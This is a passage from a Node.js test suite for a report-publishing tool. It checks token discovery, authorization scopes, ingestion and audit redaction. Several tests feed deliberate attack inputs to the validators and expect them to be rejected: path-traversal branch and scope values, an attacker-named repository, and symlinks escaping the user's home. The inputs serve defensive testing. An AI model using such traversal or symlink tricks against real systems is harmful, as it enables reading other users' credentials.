    `import { resolveReadoutProducerToken } from ${JSON.stringify(module)};`,
    "const token = await resolveReadoutProducerToken({",
    "  environment: process.env,",
    `  home: ${JSON.stringify(home)},`,
    "  operatingSystem: 'darwin',",
    "});",
    "console.log(JSON.stringify({",
    "  usedActiveProfileKeychain: token === process.env.QUICKSTARK_TEST_PROFILE_KEYCHAIN_TOKEN,",
    "  usedSharedDesktopToken: token === process.env.QS_READOUT_PRODUCER_TOKEN,",
    "}));",
  ].join("\n");
  const environment = {
    ...process.env,
    HOME: home,
    USER: "quickstark-test-user",
    CODEX_HOME: profile,
    PATH: `${bin}:${process.env.PATH ?? ""}`,
    QUICKSTARK_TEST_PROFILE_KEYCHAIN_TOKEN: profileToken,
    QS_READOUT_PRODUCER_TOKEN: sharedToken,
  };

  const { stdout, stderr } = await execFileAsync(process.execPath, [
    "--input-type=module", "--eval", evaluate,
  ], { env: environment });

  assert.deepEqual(JSON.parse(stdout), {
    usedActiveProfileKeychain: true,
    usedSharedDesktopToken: false,
  }, "a profile-specific Keychain item preserves the demo producer when no token file exists");
  assert.ok(!stdout.includes(profileToken) && !stdout.includes(sharedToken));
  assert.ok(!stderr.includes(profileToken) && !stderr.includes(sharedToken));
});

test("secure token discovery rejects a Codex profile symlink outside the current user home", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const outside = await temporaryReadoutDirectory(context);
  const credentialDirectory = join(outside, "quickstark");

  await mkdir(credentialDirectory, { recursive: true, mode: 0o700 });
  await writeFile(
    join(credentialDirectory, "producer.token"),
    "test-only-outside-user-home-producer-credential-1234567890\n",
    { encoding: "utf8", mode: 0o600 },
  );
  await symlink(outside, join(home, ".codex-demo"), "dir");

  await assert.rejects(
    resolveReadoutProducerToken({
      environment: { CODEX_HOME: join(home, ".codex-demo") },
      home,
      operatingSystem: "linux",
    }),
    /symbolic|symlink|current user home|profile|credential directory/i,
    "a symbolic-link profile must fail closed instead of loading another home's credential",
  );
});

test("secure token discovery rejects intermediate Codex profile symlinks", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const outside = await temporaryReadoutDirectory(context);
  const externalProfile = join(outside, "demo");
  const credentialDirectory = join(externalProfile, "quickstark");

  await mkdir(credentialDirectory, { recursive: true, mode: 0o700 });
  await writeFile(
    join(credentialDirectory, "producer.token"),
    "test-only-intermediate-symlink-producer-credential-1234567890\n",
    { encoding: "utf8", mode: 0o600 },
  );
  await symlink(outside, join(home, "profiles"), "dir");

  await assert.rejects(
    resolveReadoutProducerToken({
      environment: { CODEX_HOME: join(home, "profiles", "demo") },
      home,
      operatingSystem: "linux",
    }),
    /symbolic|symlink|current user home|profile|credential directory/i,
    "a symbolic link in any intermediate profile ancestor must not bypass home containment",
  );
});

test("secure machine fallback rejects tokenless Codex profile and credential-directory symlinks", async (context) => {
  for (const kind of ["profile", "intermediate", "credential-directory"]) {
    const home = await temporaryReadoutDirectory(context);
    const outside = await temporaryReadoutDirectory(context);
    const machineDirectory = join(home, ".config", "quickstark");
    const machineToken = "test-only-secure-machine-fallback-credential-1234567890";
    let profile = join(home, ".codex-demo");

    await mkdir(machineDirectory, { recursive: true, mode: 0o700 });
    await writeFile(join(machineDirectory, "producer.token"), `${machineToken}\n`, {
      encoding: "utf8",
      mode: 0o600,
    });

    if (kind === "profile") {
      await symlink(outside, profile, "dir");
    } else if (kind === "intermediate") {
      await mkdir(join(outside, "demo"), { recursive: true, mode: 0o700 });
      await symlink(outside, join(home, "profiles"), "dir");
      profile = join(home, "profiles", "demo");
    } else {
      await mkdir(profile, { recursive: true, mode: 0o700 });
      await symlink(outside, join(profile, "quickstark"), "dir");
    }

    await assert.rejects(
      resolveReadoutProducerToken({
        environment: { CODEX_HOME: profile },
        home,
        operatingSystem: "linux",
      }),
      /symbolic|symlink|current user home|profile|credential directory/i,
      `a tokenless ${kind} symlink must fail closed instead of using the machine token`,
    );
  }
});

test("a missing group-writable Codex profile credential preserves secure Linux machine-token fallback", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const profile = join(home, ".codex");
  const machineDirectory = join(home, ".config", "quickstark");
  const machineToken = "test-only-secure-linux-machine-fallback-credential-1234567890";

  await mkdir(profile, { recursive: true, mode: 0o775 });
  await chmod(profile, 0o775);
  await mkdir(machineDirectory, { recursive: true, mode: 0o700 });
  await writeFile(join(machineDirectory, "producer.token"), `${machineToken}\n`, {
    encoding: "utf8",
    mode: 0o600,
  });

  assert.equal(
    await resolveReadoutProducerToken({
      environment: { CODEX_HOME: profile },
      home,
      operatingSystem: "linux",
    }),
    machineToken,
    "a common 0775 Codex profile with no producer file cannot disable an existing secure machine credential",
  );

  const profileDirectory = join(profile, "quickstark");

  await mkdir(profileDirectory, { recursive: true, mode: 0o700 });
  await writeFile(join(profileDirectory, "producer.token"), `${"p".repeat(64)}\n`, {
    encoding: "utf8",
    mode: 0o600,
  });

  await assert.rejects(
    resolveReadoutProducerToken({
      environment: { CODEX_HOME: profile },
      home,
      operatingSystem: "linux",
    }),
    /symbolic|current user home|credential directory/i,
    "an actual profile credential below a group-writable ancestor still fails closed",
  );
});

test("Codex profile credential discovery rejects unsafe files and never crosses another user home", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const directory = join(home, ".config", "quickstark");
  const credentialPath = join(directory, "producer.token");
  await mkdir(directory, { recursive: true, mode: 0o700 });

  await writeFile(credentialPath,
    "test-only-insecure-profile-credential-1234567890\n", {
      encoding: "utf8",
      mode: 0o644,
    });
  await chmod(credentialPath, 0o644);

  await assert.rejects(
    resolveReadoutProducerToken({ environment: {}, home, operatingSystem: "linux" }),
    /owner-only regular file/i,
    "group-readable or world-readable profile credentials must never be used",
  );

  await unlink(credentialPath);
  const outside = join(home, "outside.token");
  await writeFile(outside, "test-only-symlink-target-credential-1234567890\n", {
    encoding: "utf8",
    mode: 0o600,
  });
  await symlink(outside, credentialPath);

  await assert.rejects(
    resolveReadoutProducerToken({ environment: {}, home, operatingSystem: "linux" }),
    /owner-only regular file/i,
    "symbolic-link token files must never escape the configured private profile",
  );

  await assert.rejects(
    resolveReadoutProducerToken({
      environment: { CODEX_HOME: join(tmpdir(), "another-user-codex-profile") },
      home,
      operatingSystem: "linux",
    }),
    /current user home/i,
    "profile discovery must never read a Codex root outside the actual user home",
  );

  await assert.rejects(
    resolveReadoutProducerToken({
      environment: { QS_READOUT_PRODUCER_TOKEN: "not-a-valid-token" },
      home,
      operatingSystem: "linux",
    }),
    /valid private producer token/i,
    "an explicitly invalid configured token must fail closed instead of choosing another profile",
  );
});

test("one authorized reporting token publishes Git projects without remotes and ordinary local workspaces", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const localDirectory = await temporaryReadoutDirectory(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const environment = { ...process.env };

  delete environment.QS_READOUT_PUBLISH_PROJECTS;
  delete environment.QS_READOUT_PRODUCER_ID;
  delete environment.QS_READOUT_HARNESS;

  Object.assign(environment, {
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  });

  for (const [cwd, source] of [
    [await temporaryGitProject(context), "git-root"],
    [await temporaryReadoutDirectory(context), "workspace"],
  ]) {
    const { stdout, stderr } = await execFileAsync(process.execPath, [
      script,
      "render",
      "--data", JSON.stringify({
        skill: "qs-code-build",
        outcome: `Publish the actual ${source} using only its authorized token.`,
      }),
      "--directory", localDirectory,
      "--json",
    ], { cwd, env: environment });
    const result = JSON.parse(stdout);

    assert.equal(result.projectIdentity.host, "local");
    assert.equal(result.projectIdentity.source, source);
    assert.match(result.projectIdentity.key, new RegExp(`^local/${source}/[a-zA-Z0-9._-]+-[a-f0-9]{12}$`));
    assert.equal(result.publication.status, "published");
    assert.equal(result.publication.project, result.projectIdentity.key);
    assert.ok(result.url.startsWith(viewer.url));
    assert.doesNotMatch(stdout, /test-only-codex-laptop-credential/);
    assert.doesNotMatch(stderr, /test-only-codex-laptop-credential/);

    const response = await fetch(result.url);
    const html = await response.text();

    assert.equal(response.status, 200);
    assert.match(html, /<meta name="quickstark:producer" content="codex-laptop">/);
    assert.match(html, /<meta name="quickstark:harness" content="codex">/);
    assert.match(html, new RegExp(`<meta name="quickstark:project-source" content="${source}">`));
    assert.doesNotMatch(html, new RegExp(cwd.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  }

  const index = await (await fetch(viewer.url)).text();

  assert.match(index, /git-root/);
  assert.match(index, /workspace/);
});

test("automatic cross-machine publication preserves the originating Git branch, revision, and worktree", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const cwd = await temporaryGitProject(
    context,
    "https://github.com/quickstarkdemo/reporting-sandbox.git",
  );

  await execFileAsync("git", ["-C", cwd, "branch", "-M", "feature/observed-client-metadata"]);
  await writeFile(join(cwd, "README.md"), "Recorded originating checkout.\n", "utf8");
  await execFileAsync("git", ["-C", cwd, "add", "README.md"]);
  await execFileAsync("git", [
    "-C", cwd,
    "-c", "user.name=QuickStark regression fixture",
    "-c", "user.email=regression@example.invalid",
    "commit", "--quiet", "--no-gpg-sign", "-m", "Record originating Git context",
  ]);
  await writeFile(join(cwd, "uncommitted-note.txt"), "Observed local worktree change.\n", "utf8");

  const revision = (await execFileAsync("git", ["-C", cwd, "rev-parse", "HEAD"]))
    .stdout.trim();
  const localDirectory = await temporaryReadoutDirectory(context);
  const { stdout } = await execFileAsync(process.execPath, [
    join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
    "render",
    "--data", JSON.stringify({
      skill: "qs-test-tdd",
      outcome: "Preserve independently observed Git evidence across authenticated hosted publication.",
      nextSkills: [],
    }),
    "--directory", localDirectory,
    "--json",
  ], {
    cwd,
    env: {
      ...process.env,
      QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
      QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
      QS_READOUT_PUBLISH_RETRY_DELAY: "0",
    },
  });
  const result = JSON.parse(stdout);

  assert.equal(result.publication.status, "published");

  const local = await readFile(result.path, "utf8");
  const hosted = await fetch(result.publication.url);

  assert.equal(hosted.status, 200);

  for (const [location, html] of [
    ["local", local],
    ["hosted", await hosted.text()],
  ]) {
    assert.ok(
      /<meta name="quickstark:git-branch" content="feature\/observed-client-metadata">/
        .test(html),
      `${location} reports preserve the actual originating Git branch`,
    );
    assert.ok(
      new RegExp(`<meta name="quickstark:git-revision" content="${revision}">`).test(html),
      `${location} reports preserve the actual originating Git revision`,
    );
    assert.ok(
      /<meta name="quickstark:git-dirty-count" content="1">/.test(html),
      `${location} reports preserve the observed originating worktree state`,
    );
    assert.doesNotMatch(
      html,
      /<meta name="quickstark:(?:model|total-tokens|reasoning-effort)"/,
      `${location} reports do not invent unavailable Codex usage telemetry`,
    );
  }
});

test("hosted originating Git evidence rejects unsafe claims and remains immutable across retries", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const observed = {
    projectKey: "github.com/quickstark/skills",
    branch: "feature/verified-producer-evidence",
    revision: "0123456789abcdef0123456789abcdef01234567",
    ahead: 1,
    behind: 0,
    dirtyCount: 2,
  };

  for (const [description, gitContext] of [
    ["a different project", { ...observed, projectKey: "github.com/quickstark/marketplace" }],
    ["an unsafe branch", { ...observed, branch: "../../credentials" }],
    ["an incomplete revision", { ...observed, revision: "01234567" }],
    ["a negative upstream count", { ...observed, ahead: -1 }],
    ["a negative worktree count", { ...observed, dirtyCount: -1 }],
    ["an unexpected secret field", { ...observed, token: "must-never-be-accepted" }],
  ]) {
    const rejected = await submitIngestion(ingestion, nativeIngestionEnvelope({ gitContext }));

    assert.equal(rejected.status, 422, `hosted ingestion rejects ${description}`);
    assert.deepEqual(await rejected.json(), { error: "invalid_readout" });
  }

  const envelope = nativeIngestionEnvelope({ gitContext: observed });
  const first = await submitIngestion(ingestion, envelope);

  assert.equal(first.status, 201);

  const accepted = await first.json();
  const original = await (await fetch(accepted.url)).text();

  assert.ok(original.includes('content="feature/verified-producer-evidence"'));
  assert.ok(original.includes('content="0123456789abcdef0123456789abcdef01234567"'));

  const identical = await submitIngestion(ingestion, envelope);

  assert.equal(identical.status, 200);

  const altered = await submitIngestion(ingestion, nativeIngestionEnvelope({
    gitContext: { ...observed, dirtyCount: 3 },
  }));

  assert.equal(altered.status, 409, "a changed originating Git observation cannot rewrite history");
  assert.deepEqual(await altered.json(), { error: "run_conflict" });
  assert.equal(await (await fetch(accepted.url)).text(), original);
  assert.ok(accepted.url.startsWith(viewer.url));
});

test("token-only reporting defaults to the trusted reports API and server-authenticated producer", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
  const envelope = nativeIngestionEnvelope();

  delete envelope.producer;

  let requestedEndpoint;
  const result = await publishSkillReadout(envelope, {
    token: "test-only-codex-laptop-credential-1234567890",
    cwd,
    reportBaseUrl: viewer.url,
    fetcher: async (endpoint, options) => {
      requestedEndpoint = endpoint.href;

      return fetch(new URL("api/v1/readouts", ingestion.url), options);
    },
  });

  assert.equal(DEFAULT_READOUT_INGESTION_URL, "https://reports.quickstark.com/api/v1/readouts");
  assert.equal(requestedEndpoint, DEFAULT_READOUT_INGESTION_URL);
  assert.equal(result.status, "published");
  assert.equal(result.project, "github.com/quickstark/skills");
  assert.ok(result.url.startsWith(viewer.url));

  const response = await fetch(result.url);
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /<meta name="quickstark:producer" content="codex-laptop">/);
});

test("automatic reporting refuses a claimed project outside the actual verified working directory", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
  const noOrigin = await temporaryReadoutDirectory(context);
  const options = {
    endpoint: new URL("api/v1/readouts", ingestion.url).href,
    token: "test-only-codex-laptop-credential-1234567890",
  };

  assert.deepEqual(await publishSkillReadout(nativeIngestionEnvelope({
    project: "https://github.com/quickstark/marketplace.git",
  }), { ...options, cwd }), {
    status: "local-only",
    reason: "project_not_authorized",
  });

  assert.deepEqual(await publishSkillReadout(nativeIngestionEnvelope(), {
    ...options,
    cwd: noOrigin,
  }), {
    status: "local-only",
    reason: "project_not_authorized",
  });
});

test("owner-scoped publication rejects unrelated owners before disclosing project evidence", async (context) => {
  const scopes = ["github.com/quickstark/*", "github.com/quickstarkdemo/*"];
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: scopes },
    ingestion: {
      allowedProjects: scopes,
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: scopes,
      }],
    },
  });

  for (const project of [
    "https://github.com/globodai-group/mcp-linkedin-sales-navigator.git",
    "https://github.com/quickstark-attacker/marketplace.git",
    "https://gitlab.com/quickstark/marketplace.git",
    "https://github.com/quickstark/nested/marketplace.git",
  ]) {
    const result = await publishSkillReadout(nativeIngestionEnvelope({ project }), {
      endpoint: new URL("api/v1/readouts", ingestion.url).href,
      token: "test-only-codex-laptop-credential-1234567890",
      allowedProjects: scopes,
    });

    assert.deepEqual(result, {
      status: "local-only",
      reason: "project_not_authorized",
    }, project);

    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({ project }));

    assert.equal(response.status, 403, project);
    assert.deepEqual(await response.json(), { error: "publication_not_authorized" });
  }

  assert.doesNotMatch(await (await fetch(viewer.url)).text(), /globodai-group|quickstark-attacker|gitlab\.com|mcp-linkedin/i);
});

test("owner-scoped readout authorization rejects unsafe and unrestricted project patterns", async (context) => {
  const directory = await temporaryReadoutDirectory(context);

  for (const scope of [
    "github.com/*",
    "github.com/*/*",
    "github.com/quickstark/**",
    "github.com/quickstark/*/nested",
    "github.com/quickstark/../*",
    "github.com/quickstark/%2e%2e/*",
    "https://github.com/quickstark/*",
  ]) {
    await assert.rejects(startReadoutServer({
      directory,
      port: 0,
      publicationMode: "hosted",
      allowedProjects: [scope],
    }), /safe, canonical host\/owner\/(?:repository|project)|safe.*scope/i, scope);
  }
});

test("every promoted skill publishes to the authenticated reports API without requiring a local viewer", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const localDirectory = await temporaryReadoutDirectory(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const credential = "test-only-codex-laptop-credential-1234567890";
  const environment = {
    ...process.env,
    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
    QS_READOUT_PRODUCER_ID: "codex-laptop",
    QS_READOUT_PRODUCER_TOKEN: credential,
    QS_READOUT_PUBLISH_PROJECTS: "github.com/quickstark/skills",
    QS_READOUT_HARNESS: "codex-desktop",
    QS_READOUT_PUBLISH_MAX_ATTEMPTS: "2",
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  };

  for (const skill of SKILLS) {
    const input = {
      skill: skill.name,
      projectIdentity: explicitProject("skills"),
      outcome: `Publish the actual ${skill.displayName} report without a local viewer.`,
    };
    const { stdout, stderr } = await execFileAsync(process.execPath, [
      script,
      "render",
      "--data", JSON.stringify(input),
      "--directory", localDirectory,
      "--json",
    ], {
      cwd: localDirectory,
      env: environment,
    });
    const result = JSON.parse(stdout);

    assert.equal(result.skill, skill.name, `${skill.name} records the actual native skill`);
    assert.equal(result.publication.status, "published", `${skill.name} publishes to the authenticated API`);
    assert.equal(result.viewerReused, null, `${skill.name} does not depend on a local viewer`);
    assert.ok(result.publication.url.startsWith(viewer.url), `${skill.name} uses the verified hosted viewer`);
    assert.equal(result.url, result.publication.url, `${skill.name} returns the actual verified hosted report`);
    assert.equal(await exists(result.path), true, `${skill.name} preserves its immutable local report`);
    assert.doesNotMatch(stdout, new RegExp(credential), `${skill.name} never prints its private credential`);
    assert.doesNotMatch(stderr, new RegExp(credential), `${skill.name} never logs its private credential`);

    const response = await fetch(result.publication.url);

    assert.equal(response.status, 200, `${skill.name} exposes its real authenticated-library report`);
    assert.match(await response.text(), new RegExp(`content="${skill.name}"`));
  }
});

test("an explicitly configured native skill render automatically publishes its real local readout", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const localDirectory = await temporaryReadoutDirectory(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const input = {
    skill: "qs-code-build",
    outcome: "Automatically publish an explicitly opted-in local skill run.",
    reportId: "f0179c6b-f9f9-4c7b-b877-7143f3a95d12",
    generatedAt: "2026-07-26T14:00:00.000Z",
    nextSkills: [],
  };
  const { stdout } = await execFileAsync(process.execPath, [
    script,
    "render",
    "--data", JSON.stringify(input),
    "--directory", localDirectory,
    "--no-serve",
    "--json",
  ], {
    cwd: repositoryRoot,
    env: {
      ...process.env,
      QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
      QS_READOUT_PRODUCER_ID: "codex-laptop",
      QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
      QS_READOUT_PUBLISH_PROJECTS: "github.com/quickstark/skills",
      QS_READOUT_HARNESS: "codex-desktop",
      QS_READOUT_PUBLISH_MAX_ATTEMPTS: "2",
      QS_READOUT_PUBLISH_RETRY_DELAY: "0",
    },
  });

  const result = JSON.parse(stdout);
  assert.equal(result.publication.status, "published");
  assert.equal(await exists(result.path), true);

  const html = await (await fetch(result.publication.url)).text();
  assert.match(html, /Automatically publish an explicitly opted-in local skill run/);
  assert.match(html, /quickstark:harness" content="codex-desktop/);
  assert.match(await (await fetch(viewer.url)).text(), /Automatically publish an explicitly opted-in local skill run/);
});

test("the hosted reporting stack isolates authenticated ingestion from its read-only viewer", async () => {
  const compose = await readFile(join(repositoryRoot, "deploy", "readouts", "compose.yaml"), "utf8");
  const service = (name) => {
    const match = compose.match(new RegExp(
      "^  " + name + ":\\n([\\s\\S]*?)(?=^  [a-z0-9-]+:\\n|^networks:)",
      "m",
    ));

    assert.ok(match, "Expected the independently isolated " + name + " runtime.");

    return match[0];
  };
  const viewer = service("quickstark-readouts");
  const ingestion = service("quickstark-readout-ingestion");
  const settings = service("quickstark-readout-settings");

  assert.match(compose, /quickstark-readout-ingestion:/);
  assert.match(compose, /QS_READOUT_PUBLIC_URL:\s*https:\/\/reports\.quickstark\.com\/?/);
  assert.match(compose, /QS_READOUT_PRODUCERS_FILE:\s*\/run\/quickstark\/readout-producers\.json/);
  assert.match(compose, /traefik\.http\.routers\.quickstark-readout-ingestion\.rule=Host\(`reports\.quickstark\.com`\)\s*&&\s*Path\(`\/api\/v1\/readouts`\)/);
  assert.match(compose, /traefik\.http\.services\.quickstark-readout-ingestion\.loadbalancer\.server\.port=4174/);
  assert.match(compose, /quickstark-readout-ingestion:4174\/__quickstark_ingestion_health/);
  assert.match(compose, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts:rw/);
  assert.match(compose, /\/docker\/appdata\/quickstark-readouts-config:\/run\/quickstark:ro/);
  assert.doesNotMatch(compose, /readout-producers\.json:\/run\/quickstark\/readout-producers\.json:ro/);
  assert.doesNotMatch(viewer, /quickstark-readouts-credentials/);
  assert.doesNotMatch(ingestion, /quickstark-readouts-credentials/);
  assert.match(settings, /quickstark-readouts-credentials/);
  assert.match(settings, /quickstark-readouts-config:\/run\/quickstark-config:rw/);
  assert.match(settings, /traefik\.http\.routers\.quickstark-readout-settings\.middlewares=authelia@file/);
  assert.match(settings, /QS_READOUT_SETTINGS_ADMIN_GROUPS:\s*admins/);
  assert.doesNotMatch(settings, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts/);
  assert.match(compose, /traefik\.http\.routers\.quickstark-readouts\.middlewares=authelia@file/);
  assert.match(compose, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts:ro/);
  assert.doesNotMatch(compose, /^\s*ports:/m);
  assert.doesNotMatch(compose, /0\.0\.0\.0/);
});

test("producer-specific report identities do not collide between authorized harnesses", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context, {
    ingestion: {
      producers: [
        {
          id: "codex-laptop",
          token: "test-only-codex-laptop-credential-1234567890",
          projects: ["github.com/quickstark/skills"],
        },
        {
          id: "second-codex-laptop",
          token: "test-only-second-laptop-credential-1234567890",
          projects: ["github.com/quickstark/skills"],
        },
      ],
    },
  });
  const first = await submitIngestion(ingestion, nativeIngestionEnvelope());
  const second = await submitIngestion(ingestion, nativeIngestionEnvelope({
    producer: "second-codex-laptop",
  }), { token: "test-only-second-laptop-credential-1234567890" });

  assert.equal(first.status, 201);
  assert.equal(second.status, 201);

  const left = await first.json();
  const right = await second.json();
  assert.notEqual(left.url, right.url);
  assert.equal((await fetch(left.url)).status, 200);
  assert.equal((await fetch(right.url)).status, 200);
});

test("equivalent project origins and run-identifier casing are safe immutable retries", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const first = await submitIngestion(ingestion, nativeIngestionEnvelope());
  const same = await submitIngestion(ingestion, nativeIngestionEnvelope({
    project: "git@github.com:quickstark/skills.git",
    runId: "A6BA1C2B-D2A5-4962-B591-7D2BEC883021",
  }));

  assert.equal(first.status, 201);
  assert.equal(same.status, 200);
  assert.equal((await same.json()).url, (await first.json()).url);
});

test("ingestion derives project display identity from authorized canonical ownership", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    project: {
      ...explicitProject("skills"),
      label: "forged-owner/private-client-project",
    },
  }));

  assert.equal(response.status, 201);

  const report = await (await fetch((await response.json()).url)).text();
  const gallery = await (await fetch(viewer.url)).text();
  assert.match(report, /quickstark\/skills/);
  assert.doesNotMatch(report, /forged-owner|private-client-project/);
  assert.doesNotMatch(gallery, /forged-owner|private-client-project/);
});

test("ingestion rejects a symbolic-link escape outside the approved project library", async (context) => {
  const { ingestion, directory } = await temporaryReadoutIngestion(context);
  const outside = await temporaryReadoutDirectory(context);
  await symlink(outside, join(directory, "github.com"), "dir");

  const response = await submitIngestion(ingestion, nativeIngestionEnvelope());

  assert.equal(response.status, 503);
  assert.deepEqual(await response.json(), { error: "readout_unavailable" });
  assert.deepEqual(await readdir(outside), []);
});

test("an accepted skill run recovers its immutable report after an interrupted visible write", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const first = await submitIngestion(ingestion, nativeIngestionEnvelope());
  const accepted = await first.json();
  const pathname = new URL(accepted.url).pathname;
  const relativePath = decodeURIComponent(pathname).replace(/^\//, "");
  const reportPath = join(ingestion.directory, ...relativePath.split("/"));

  await unlink(reportPath);

  const recovered = await submitIngestion(ingestion, nativeIngestionEnvelope());
  assert.equal(recovered.status, 200);
  assert.equal((await recovered.json()).url, accepted.url);
  assert.equal((await fetch(accepted.url)).status, 200);
});

test("the publisher retries a transient report-ingestion outage within a strict bound", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  let attempts = 0;
  const gateway = createHttpServer(async (request, response) => {
    attempts += 1;

    if (attempts === 1) {
      response.writeHead(503, { "Content-Type": "application/json" });
      response.end(JSON.stringify({ error: "readout_unavailable" }));
      return;
    }

    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);

    const upstream = await fetch(new URL("api/v1/readouts", ingestion.url), {
      method: "POST",
      headers: {
        "Content-Type": "application/json; charset=utf-8",
        Authorization: request.headers.authorization,
      },
      body: Buffer.concat(chunks),
    });

    response.writeHead(upstream.status, { "Content-Type": "application/json" });
    response.end(await upstream.text());
  });

  await new Promise((done, fail) => {
    gateway.once("error", fail);
    gateway.listen(0, "127.0.0.1", done);
  });

  context.after(async () => {
    if (!gateway.listening) return;
    await new Promise((done, fail) => gateway.close((error) => error ? fail(error) : done()));
  });

  const gatewayPort = gateway.address().port;
  const result = await publishSkillReadout(nativeIngestionEnvelope(), {
    endpoint: `http://127.0.0.1:${gatewayPort}/api/v1/readouts`,
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
    maxAttempts: 2,
    retryDelay: 0,
  });

  assert.equal(attempts, 2);
  assert.equal(result.status, "published");
  assert.equal((await fetch(result.url)).status, 200);

  attempts = 0;

  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const { stdout } = await execFileAsync(process.execPath, [
    script,
    "publish",
    "--data", JSON.stringify(nativeIngestionEnvelope()),
    "--endpoint", `http://127.0.0.1:${gatewayPort}/api/v1/readouts`,
    "--allowed-projects", "github.com/quickstark/skills",
    "--report-base-url", viewer.url,
    "--max-attempts", "2",
    "--retry-delay", "0",
    "--json",
  ], {
    env: {
      ...process.env,
      QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
    },
  });

  assert.equal(attempts, 2);
  assert.equal(JSON.parse(stdout).status, "published");
});

test("readout acceptance records only safe, redacted operational audit evidence", async (context) => {
  const events = [];
  const { ingestion } = await temporaryReadoutIngestion(context, {
    ingestion: { audit: (event) => events.push(event) },
  });
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope());

  assert.equal(response.status, 201);
  assert.equal(events.length, 1);
  assert.equal(events[0].producer, "codex-laptop");
  assert.equal(events[0].project, "github.com/quickstark/skills");
  assert.equal(events[0].status, 201);
  assert.equal(events[0].outcome, "created");
  assert.ok(!Number.isNaN(Date.parse(events[0].timestamp)));

  const recorded = JSON.stringify(events);
  assert.doesNotMatch(recorded, /test-only-codex-laptop-credential/);
  assert.doesNotMatch(recorded, /The real report is available/);
});

test("the actual production ingestion command emits redacted structured audit events", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const grantsPath = join(directory, "test-producer-grants.json");
  const secret = "test-only-codex-laptop-credential-1234567890";

  await writeFile(grantsPath, JSON.stringify({
    version: 1,
    producers: [{
      id: "codex-laptop",
      tokenSha256: createHash("sha256").update(secret).digest("hex"),
      projects: ["github.com/quickstark/skills"],
    }],
  }), { encoding: "utf8", mode: 0o600 });

  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const child = spawn(process.execPath, [
    script,
    "ingest",
    "--directory", directory,
    "--host", "127.0.0.1",
    "--port", "0",
    "--base-url", "http://127.0.0.1:4173/",
    "--allowed-projects", "github.com/quickstark/skills",
    "--producers-file", grantsPath,
  ], { cwd: repositoryRoot, stdio: ["ignore", "pipe", "pipe"] });

  context.after(() => {
    if (child.exitCode === null && !child.killed) child.kill();
  });

  let stdout = "";
  let stderr = "";

  child.stdout.setEncoding("utf8");
  child.stderr.setEncoding("utf8");
  child.stdout.on("data", (chunk) => { stdout += chunk; });
  child.stderr.on("data", (chunk) => { stderr += chunk; });

  const waitFor = (stream, current, pattern) => new Promise((done, fail) => {
    const finish = () => {
      if (!pattern.test(current())) return;
